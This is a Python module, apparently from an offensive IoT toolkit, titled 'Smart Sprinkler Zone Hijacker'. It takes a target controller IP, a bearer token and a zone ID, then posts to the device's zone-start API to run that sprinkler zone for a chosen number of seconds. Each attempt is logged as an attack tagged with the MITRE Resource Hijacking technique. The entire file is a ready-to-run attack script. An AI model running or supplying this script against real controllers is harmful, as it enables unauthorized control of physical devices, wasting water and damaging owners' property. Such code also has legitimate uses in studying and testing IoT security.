# modules/exploits/sprinkler_zone_hijacker.py

import argparse
import requests
import json
from datetime import datetime
import os

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1496"  # Resource Hijacking

def log_attack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH) as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def trigger_zone(ip, token, zone_id, duration=300):
    url = f"http://{ip}/api/4/zone/start"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}"
    }
    payload = {
        "zones": [{
            "id": zone_id,
            "duration": duration
        }]
    }

    response = requests.post(url, headers=headers, json=payload)

    log_attack({
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": ip,
        "zone_id": zone_id,
        "duration": duration,
        "success": response.status_code == 200,
        "ttp": MITRE_TTP
    })

    if response.status_code == 200:
        print(f"[âœ“] Sprinkler zone {zone_id} triggered for {duration} seconds.")
    else:
        print(f"[!] Failed to trigger zone {zone_id}: {response.status_code}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Smart Sprinkler Zone Hijacker")
    parser.add_argument("--ip", required=True, help="Target sprinkler controller IP")
    parser.add_argument("--token", required=True, help="Authorization token")
    parser.add_argument("--zone", type=int, required=True, help="Zone ID to trigger")
    parser.add_argument("--duration", type=int, default=300, help="Duration in seconds")
    args = parser.parse_args()
    trigger_zone(args.ip, args.token, args.zone, args.duration)
